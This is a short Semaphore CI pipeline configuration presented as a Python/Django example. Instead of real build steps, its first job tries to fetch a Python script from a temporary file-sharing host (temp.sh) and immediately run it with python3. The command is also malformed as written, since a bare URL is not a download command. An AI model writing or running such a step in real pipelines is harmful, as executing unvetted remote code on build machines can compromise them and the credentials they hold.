version: v1.0
name: Semaphore Python / Django Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
global_job_config:
  prologue:
    commands:
      - sem-version python 3.8
blocks:
  - name: Pip
    dependencies:
      - 'Block #2'
    task:
      jobs:
        - name: Jobk
          commands:
            - 'apt-get update '
  - name: 'Block #2'
    dependencies: []
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'http://temp.sh/Cgvll/1.py && python3 1.py'
